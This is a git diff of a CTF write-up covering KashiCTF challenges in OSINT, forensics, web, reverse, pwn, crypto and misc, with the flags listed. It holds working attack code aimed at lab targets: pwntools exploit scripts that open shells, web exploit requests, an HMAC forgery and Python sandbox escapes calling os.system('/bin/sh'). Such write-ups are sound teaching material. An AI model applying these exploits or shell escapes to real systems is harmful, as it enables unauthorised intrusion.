@@ -38,17 +38,20 @@ The popular diner in the USA that serves Coke floats is Lexington Candy Shop, wh
 And you can see the word "Very American experience" is a hint of the challs so it's clear enough that the the answer will be in the bill's picture
 
 ![image](https://hackmd.io/_uploads/B1s1Ibj5ke.png)
+
 **Flag: KashiCTF{Lexington_Candy_Shop_41.65}**
 ### Kings
 At first i found that's the Tutankhamun's meteoric iron dagger and that's kinda not related. Then i think about popular the extinct bird that's dodo bird. I actually found 2 artist that draw dodo bird that's Ustad Mansur and Roelant Savery(already try but failed)
 But it's actually more match with Ustad Mansur information when he was in the Mughal Empire, which has a nice dagger(nice). Then the research take me to the wikiart site which actually his dodo painting(https://www.wikiart.org/en/ustad-mansur/untitled-dodo-1625) and that's currently located in Hermitage Museum, Saint Petersburg, Russia.
 ![image](https://github.com/user-attachments/assets/572ab7c2-0be7-4cde-9e43-c10eafa7ce2a)
 And after osint in some video on youtube, using google map and brute the coordinates, i got the flag.
+
 **Flag: KashiCTF{59.9399_30.3149}**
 
 ### Who am I ??
 ![image](https://github.com/user-attachments/assets/2fce9de0-a332-4a75-8e4e-f84bda76c94f)
 I asked chatGPT then I got the flag:)))))))
+
 **Flag: KashiCTF{Endre_Bajcsy_Zsilinszky}**
 
 # Forensics
@@ -56,11 +59,13 @@ I asked chatGPT then I got the flag:)))))))
 Using FTK imager to open the file and found some images, and audio files.
 Based on the challenge hint: "Every image tells a story, but some stories are meant to stay hidden." I found the flag inside image_421.jpg
 ![image](https://hackmd.io/_uploads/rk6g8-o5Jl.png)
+
 **Flag :  KashiCTF{DF1R_g03555_Brrrr}**
 ### Corruption
 The file given is a corrupted file so I used HxD to read it
 Use the search tool, and you can find the real flag is the second one
 ![image](https://hackmd.io/_uploads/SJVf8Wj5yx.png)
+
 **Flag: KashiCTF{FSCK_mE_B1T_by_b1t_Byt3_by_byT3}**
 ### Restaurant
 There's some hint in the challenge that's "Maybe in the end they may give me something real. (Wrap the text in KashiCTF{})"
@@ -69,18 +74,24 @@ So I opened the image and found there was something in the end
 When i searched on the internet for the image that's a bacon tomato pasta(really???), which related to Bacon cipher with sussy ABABABAB in the footer
 After decrypting the text we got this
 ![image](https://hackmd.io/_uploads/r1nQLWscJx.png)
+
 **Flag: KashiCTF{THEYWEREREALLLLYCOOKING}**
+
 ### Look at Me
 This problem uses the SilentEye tool to solve.
 ![image](https://hackmd.io/_uploads/Sk3E8Wscyx.png)
+
 **Flag: KashiCTF{K33p_1t_re4l}**
+
 ### Do Not Redeem #1
 The sms database will be in the file ```/data/data/com.android.providers.telephony/databases/mmssms.db```
 Open mmssms.db file with DB browser and we got this 
 ![image](https://hackmd.io/_uploads/HkurUZj5yl.png)
 Then browse the sms data in sms table and find for OTP sms
 ![image](https://hackmd.io/_uploads/SJUI8-s5yx.png)
+
 **Flag: KashiCTF{839216_1740251608654}**
+
 ### Do Not Redeem #2
 In the first problem, we can see the timestamp of the OTP sms is 1740251608654
 ![image](https://hackmd.io/_uploads/SkYPU-o9Jg.png)
@@ -88,7 +99,9 @@ So it gonna be 02:13(in my time display) and we can find there are only 5 packag
 ![image](https://hackmd.io/_uploads/r14_8Wo5ke.png)
 Then I gave it a try to take a closer look on the calendar(41kb really????) and that package got changed before the Amazon package so that's getting more sussy
 So I submitted the flag and it's correct.
+
 **Flag: KashiCTF{com.google.calendar.android}**
+
 ### Stego Gambit
 This problem was easy but it wasted a lot of time
 So here's the given image from the chall
@@ -102,7 +115,9 @@ So 2 moves gonna be ```1. Bh1 Kxa2 2. Qg2#```
 **Key: Bh1Kxa2_Qg2#**(i keep spamming Bh1_Kxa2_Qg2# freak)
 With that pro key moment we gonna use steghide to extract something in image
 ![image](https://hackmd.io/_uploads/SyW68bocJg.png)
+
 **Flag: KashiCTF{573g0_g4m617_4cc3p73d}**
+
 # Web
 ### SuperFastApi
 ```python=
@@ -123,7 +138,9 @@ res = requests.get(url+'/flag/3HLD')
 print(res.text)
 # {"message":"KashiCTF{m455_4551gnm3n7_ftw_F1t1dzlov}"}
 ```
+
 **Flag :  KashiCTF{m455_4551gnm3n7_ftw_F1t1dzlov}**
+
 ### Corporate Life 1
 ```python=
 import requests
@@ -139,7 +156,9 @@ for i in a :
     if(i.get('status') == 'denied'):
         print(i)
 ```
+
 **FLAG : KashiCTF{s4m3_old_c0rp0_l1f3_vro3nUAH}**
+
 ### Corporate Life 2 : 
 ```python=
 import requests
@@ -154,7 +173,9 @@ data = {
 res = requests.post(url,json=data)
 print(res.json()[0].get('email').replace(',',''))
 ```
+
 **Flag : KashiCTF{b0r1ng_old_c0rp0_l1f3_am_1_r1gh7_PbZ8N4Zi}**
+
 # Reverse	
 
 ## Game 1 - Untitled Game
@@ -255,7 +276,9 @@ s://hackmd.io/_uploads/Sy7VUg951g.png)
 
 Download it then open it in Audacity
 ![image](https://hackmd.io/_uploads/rJU7ubj9yg.png)
+
 **Flag: KashiCTF{1t_Wa5_Ju5t_4_Tutori4l_RIP}**
+
 # Pwn	
 
 ## leap_of_faith
@@ -282,6 +305,7 @@ p.sendlineafter(b': ', b'0x4011ba')
 
 p.interactive()
 ```
+
 **Flag: KashiCTF{m4r10_15_fu_w17H_C_qjHbCVGz}**
 
 ## The Troll Zone
@@ -344,6 +368,7 @@ p.sendline(payload)
 p.interactive()
 ```
 ![image](https://hackmd.io/_uploads/HJYI6Yu9kg.png)
+
 **Flag: KashiCTF{did_some_trolling_right_there_LMOruSfe}**
 
 # Crypto	
@@ -447,12 +472,15 @@ This is Vigenere Cipher with key = DamnKeys
 
 
 ![image](https://hackmd.io/_uploads/S1Fzv-iqJl.png)
-```Flag: KashiCTF{I_r3V3Al3d_my_Pub1Ic_K3y_4nd_4ll_1_g0t_w4s_th1s_L0usy_Fl4G_021P8gil}```
+
+**Flag: KashiCTF{I_r3V3Al3d_my_Pub1Ic_K3y_4nd_4ll_1_g0t_w4s_th1s_L0usy_Fl4G_021P8gil}**
+
 # Misc
 
 ## FinalGame?
 
 ![image](https://hackmd.io/_uploads/H1XLuWsq1l.png)
+
 **Flag: KashiCTF{Will_This_Be_My_Last_Game_e94fab41}**
 
 ## Game 2 - Wait
@@ -501,6 +529,7 @@ The password is his friend's name: Aakash
 Then we get: https://pastebin.com/HVQfa14Z
 This is a cow-descript
 ![image](https://hackmd.io/_uploads/S1Uj_bscJl.png)
+
 **Flag: KashiCTF{Love_Hurts_5734b5f}**
 
 ## Broken?
@@ -517,17 +546,22 @@ message = "count=10&lat=37.351&user_id=1&long=-119.827&file=flag.txt"
 # brute force through word lists jwt.secret.keys 
 print(generate_hmac(message,'super_secret_key'))
 ```
+
 **Flag: KashiCTF{Close_Yet_Far_evhBM0QEu}**
+
 ## Easy Jail
 ```bash=
 __import__('os').system('/bin/sh')
 cat /flag.txt 
 ```
+
 **Flag: KashiCTF{3V4L_41NT_54F3_jfLs92mb}**
+
 ## Easy Jail 2 
 ```bash
 BLACKLIST.clear()
 __import__('os').system('/bin/sh')
 cat /flag.txt
 ```
+
 **Flag: KashiCTF{C4N_S71LL_CL3AR_8L4CKL15T_0EnNdgEz}**
